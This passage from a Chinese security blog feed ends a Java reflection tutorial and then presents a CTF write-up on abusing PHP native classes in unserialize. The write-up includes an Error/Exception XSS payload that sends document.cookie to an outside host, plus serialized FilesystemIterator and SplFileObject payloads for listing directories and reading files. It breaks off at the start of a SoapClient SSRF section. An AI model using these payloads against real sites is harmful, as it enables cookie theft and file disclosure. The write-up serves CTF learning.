</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Field field = stu.getField(<span class="string">&quot;address&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/gDtkKdsmq2fT5zb.png" alt="image.png"></p><p>4.返回<strong>单个成员</strong>变量对象：<code>getDeclaredField(String name)</code>：里面的参数同样为变量名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Field field = stu.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/6OkvzmtbIsrC4jp.png" alt="image.png"></p><p>获取了成员变量之后，我们怎么给它赋值呢，这里就用到<code>Field</code>类中的<code>set</code>方法来给成员变量赋值，用法为：</p><p><code>void set(Object obj,Object value)</code>：给<code>obj</code>对象的成员变量赋值为<code>value</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; con2 = stu.getConstructor(String.class,<span class="keyword">int</span>.class,String.class);</span><br><span class="line">        Object obj = con2.newInstance(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>,<span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        Field field = stu.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,<span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/1MiUgE8YekA6rts.png" alt="image.png"></p><h2 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h2><p>获取成员方法和获取成员变量方法基本上一模一样，也是四种方法</p><p>1.返回所有<strong>公共成员方法</strong>对象的数组，包括继承的方法：<code>getMethods()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Method []methods = stu.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/qRVN18UIW7aLblX.png" alt="image.png"></p><p>2.返回<strong>所有成员方法</strong>对象的数组，不包括继承的：<code>getDeclaredMethods()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Method []methods = stu.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/UEs4OgSNa7weqcl.png" alt="image.png"></p><p>3.返回单个<strong>公共成员方法</strong>对象：<code>getMethod(String name,Class&lt;?&gt;...parameterTypes)</code>，<code>name</code>参数填写方法名，后面那个参数填该方法的参数类型，如<code>String.class</code>等，如果是无参则不填，这样就可以返回单个公共成员方法了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Method method = stu.getMethod(<span class="string">&quot;method1&quot;</span>);</span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/h2EFwcYzD5bJIji.png" alt="image.png"></p><p>4.返回单个<strong>所有成员方法</strong>对象：<code>getDeclaredMethod(String name,Class&lt;?&gt;...parameterTypes)</code>，<code>name</code>参数填写方法名，后面的填方法中的参数类型，如果是无参就不填</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Method method = stu.getDeclaredMethod(<span class="string">&quot;function&quot;</span>);</span><br><span class="line">        System.out.println(method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/iQGz29fZocPasWt.png" alt="image.png"></p><p>好，方法有了，最后一个问题就是调用这些方法了，在<code>Method</code>类中有一个<code>invoke()</code>方法，可以调用方法，返回一个对象，其实这里和<code>Field</code>类中的<code>set</code>方法很像，用法为：<code>invoke(Object obj,Object...args)</code>，后面的参数就填方法中想传的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class&lt;?&gt; stu = Class.forName(<span class="string">&quot;com.testforclass.Student&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; con2 = stu.getConstructor(String.class, <span class="keyword">int</span>.class, String.class);</span><br><span class="line">        Object obj = con2.newInstance(<span class="string">&quot;Arsene.Tang&quot;</span>, <span class="number">18</span>, <span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        Method method = stu.getDeclaredMethod(<span class="string">&quot;method2&quot;</span>,String.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        obj = method.invoke(obj,<span class="string">&quot;method2222&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/SZMWf2Pjzy7CUQm.png" alt="image.png"></p><p>这样就成功调用了带参数的<code>method2</code>方法，至此Java反射差不多就到这儿了，最后给上几张黑马程序员中的图来做个总结：</p><p><img src="https://i.loli.net/2021/11/06/UshRKodPBDG2YZu.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/06/jHBXQw26lOi7hdV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/06/9NOSUjKzRrvBy8b.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Java反射&quot;&gt;&lt;a href=&quot;#Java反射&quot; class=&quot;headerlink&quot; title=&quot;Java反射&quot;&gt;&lt;/a&gt;Java反射&lt;/h1&gt;&lt;p&gt;最近&lt;code&gt;ctf&lt;/code&gt;比赛打得太多了，现在看到&lt;code&gt;ctf&lt;/code&gt;题就脑壳痛哈哈哈，就想着找点别的来学吧，换换脑筋；于是准备学学&lt;code&gt;Java&lt;/code&gt;安全，后面去研究研究&lt;code&gt;Java&lt;/code&gt;反序列化啥的，在学&lt;code&gt;Java&lt;/code&gt;反序列化之前肯定得先学&lt;code&gt;Java&lt;/code&gt;反射，虽然说学校老师讲过了但讲的太快而且难度也不太够，所以说自己重新学了学顺便来总结总结&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之PHP原生类的运用</title>
    <link href="https://arsenetang.github.io/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/"/>
    <id>https://arsenetang.github.io/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/</id>
    <published>2021-10-28T16:00:00.000Z</published>
    <updated>2021-11-04T12:29:20.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP原生类的运用"><a href="#PHP原生类的运用" class="headerlink" title="PHP原生类的运用"></a>PHP原生类的运用</h1><p>最近比赛打的挺多的，也从中学到了很多有意思的新东西，比如说<code>PHP</code>的原生类利用；之前我就很少用过它，但最近通过连续比赛中的几道CTF题目让我发现了它非常神奇的用法，这肯定得来总结总结对吧哈哈哈</p><span id="more"></span><h2 id="PHP的原生类是啥"><a href="#PHP的原生类是啥" class="headerlink" title="PHP的原生类是啥"></a>PHP的原生类是啥</h2><p>PHP原生类就是在标准PHP库中已经封装好的类，而这里面有一些类可以实现目录遍历，文件读取，发起请求等；我们就可以通过实例化这些类完成这些操作了，我们先来php手册看看PHP标准库 (SPL)：<a href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p><p>但其中只有一小部分是我们可以利用的，一般比较常见的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.Error/Exception</span><br><span class="line">2.FilesystemIterator/SplFileObject</span><br><span class="line">3.SoapClient</span><br></pre></td></tr></table></figure><p>接下来我们主要就从这三个方面来研究它的利用思路</p><h2 id="利用Error-Exception实现XSS"><a href="#利用Error-Exception实现XSS" class="headerlink" title="利用Error/Exception实现XSS"></a>利用Error/Exception实现XSS</h2><p>Error类是在php7下存在的一个内置类，是所有PHP内部错误类的基类，那这和XSS和什么关系呢？那是因为这个类中有一个内置方法，叫做<code>__toString()</code>的魔术方法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将<code>Error</code>以字符串的形式表达出来；那么假如有一个<code>echo</code>将它输出出来，而输出内容是我们是我们可以控制的，那我们就可以用<code>&lt;script&gt;</code>标签来执行js代码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>比如说上面这个例子，就将反序列化后的对象直接做了输出，那我们就可以利用<code>Error</code>类中<code>__toString()</code>实现<code>XSS</code>了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/26/KVmTBP7GoLXQvEq.png" alt="image.png"></p><p>直接用生成的这个payload就行了，成功弹窗</p><p><img src="https://i.loli.net/2021/10/26/Wi9dC6w1H3ecYmh.png" alt="image.png"></p><p>我们去查看一下源代码，就会明白它弹窗的原因：</p><p><img src="https://i.loli.net/2021/10/26/jgbA8CzaJvHPxLW.png" alt="image.png"></p><p><code>&lt;script&gt;</code>标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯</p><p>Exception类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7的环境下都能使用</p><p><img src="https://i.loli.net/2021/10/26/Lrln6WVDdu1GORU.png" alt="image.png"></p><h3 id="例题解析—BJDCTF-2nd-xss之光"><a href="#例题解析—BJDCTF-2nd-xss之光" class="headerlink" title="例题解析—BJDCTF 2nd xss之光"></a>例题解析—BJDCTF 2nd xss之光</h3><p>前面是一个git源码泄露，我们用工具down下来之后直接看到index.php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>这和我们前面讲的就很像了，我们直接用php5和php7都适用的<code>Exception</code>类，利用<code>window.location.href=&#39;url&#39;</code>实现恶意跳转就好了，exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;http://03a2443e-8a5f-41fe-83da-7e5819ead85b.node4.buuoj.cn:81/?&#x27;+document.cookie&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接打进去，然后就可以在<code>COOKIE</code>里面找到flag了</p><h2 id="目录遍历及文件操作"><a href="#目录遍历及文件操作" class="headerlink" title="目录遍历及文件操作"></a>目录遍历及文件操作</h2><p>之前我们说过，某些PHP的原生类可以实现目录遍历，读取文件等操作，那我们就来看看具体是哪些，先来看一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag就在这个目录下的某个目录中的文件里&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一段的代码，没啥花里胡哨的。而且明确告诉了flag就在当前目录下的某个目录中，那我们肯定就要想办法遍历目录了，而这里面我们又正好可以控制实例化的类，那我们就去找找哪些原生类可以遍历目录，主要是下面三个吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator: DirectoryIterator类提供了一个查看文件系统目录内容的简单接口。</span><br><span class="line">FilesystemIterator: 文件系统迭代器。</span><br><span class="line">GlobIterator: 与glob()类似的方式迭代文件系统。</span><br></pre></td></tr></table></figure><p>这里面最好用的应该就是<code>FilesystemIterator</code>了，我们来看看它是咋个用的，其它两个用法可以自行百度哈：</p><p><img src="https://i.loli.net/2021/10/26/X2vA1BbwonNkV57.png" alt="image.png"></p><p>可以看到里面提供了非常多的方法，我们可以通过这个看到文件的详细信息，但这里我们都是用不到的，我们只需要直接<code>new FilesystemIterator(&#39;./&#39;)</code>，创建一个当前目录下的迭代器就好了，但这里有局限性就是它只会列出第一个结果，如果需要多个结果需要用循环来遍历，这里肯定是做不到的，那我们就先看一个吧，我们先来构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跑出运行结果：<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:2:&quot;./&quot;;&#125;</code>，用这个直接去打</p><p><img src="https://i.loli.net/2021/10/26/fzXG26DRCgqIVpk.png" alt="image.png"></p><p>可以看到下一层目录名为<code>flag</code>，那我们继续往下遍历，看看<code>flag</code>目录里有啥，看到了flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:6:&quot;./flag&quot;;&#125;</code></p><p><img src="https://i.loli.net/2021/10/29/TERiw5joIVSQC4F.png" alt="image.png"></p><p>这时候我们就要想办法读取到<code>flag.php</code>中的内容了，这时候我们就去找找PHP原生类中有没有可以读取文件的，正好就找到一个：<code>SplFileObject</code>，用这个就可以读文件，但这个类读取文件内容是按行读取的，如果要读多行需要遍历，但这里用不到，我感觉ctf比赛中他就是故意把flag放第一行的：<a href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span> = <span class="string">&#x27;./flag/flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用这个去打就可以拿到flag了</p><p><img src="https://i.loli.net/2021/10/26/u3BpOts6vI2K9VN.png" alt="image.png"></p><h2 id="利用SoapClient实现SSRF"><a href="#利用SoapClient实现SSRF" class="headerlink" title="利用SoapClient实现SSRF"></a>利用SoapClient实现SSRF</h2><p>这应该是这篇文章的重头戏了，前面的内容说实话挺简单的，感觉也没啥操作的空间，但这个就不一样了，就很有意思哈哈哈</p><p>先来看看Soap是啥</p><p>SOAP，作为webService三要素(SOAP、WSDL、UDDI)之一，用来描述传递信息的格式，SOAP可以和现存的许多<a href="https://baike.baidu.com/item/%E5%9B%A0%E7%89%B9%E7%BD%91%E5%8D%8F%E8%AE%AE">因特网协议</a>和格式结合使用，包括<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC">超文本</a><a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">传输协议</a>（HTTP），<a href="https://baike.baidu.com/item/%E7%AE%80%E5%8D%95%E9%82%AE%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">简单邮件传输协议</a>（SMTP），<a href="https://baike.baidu.com/item/%E5%A4%9A%E7%94%A8%E9%80%94%E7%BD%91%E9%99%85%E9%82%AE%E4%BB%B6%E6%89%A9%E5%85%85%E5%8D%8F%E8%AE%AE">多用途网际邮件扩充协议</a>（MIME）。它还支持从<a href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF">消息</a>系统到<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>（RPC）等大量的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">应用程序</a>。SOAP使用基于XML的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">数据结构</a>和<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC">超文本</a><a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">传输协议</a>(HTTP)的组合定义了一个标准的方法来使用Internet上各种不同操作环境中的<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AF%B9%E8%B1%A1">分布式对象</a>。(以上来自百度百科)</p><p>看完了百度百科如此专业的解释，应该明白了大概意思，就是说这玩意儿可以发起请求，那么只要我们可以控制数据包中的内容，让它可以GET或者POST传参，那就可以发起SSRF了</p><p>而PHP中的SoapClient类，是用来创建soap数据报文，与wsdl接口进行交互的，我们可以去PHP官方手册里去看看对它的解释：<a href="https://www.php.net/manual/zh/class.soapclient.php">https://www.php.net/manual/zh/class.soapclient.php</a></p><p><img src="https://i.loli.net/2021/10/26/1TgsUJ6pfrmQGvO.png" alt="image.png"></p><p>我们先来看它的构造方法，可以看到它的构造方法中有两个参数，第一个参数<code>$wsdl</code>用来指明是否为<code>wsdl</code>模式，关于<code>wsdl</code>模式是啥这里我就不展开讲了，想了解的朋友可以看看这篇文章：<a 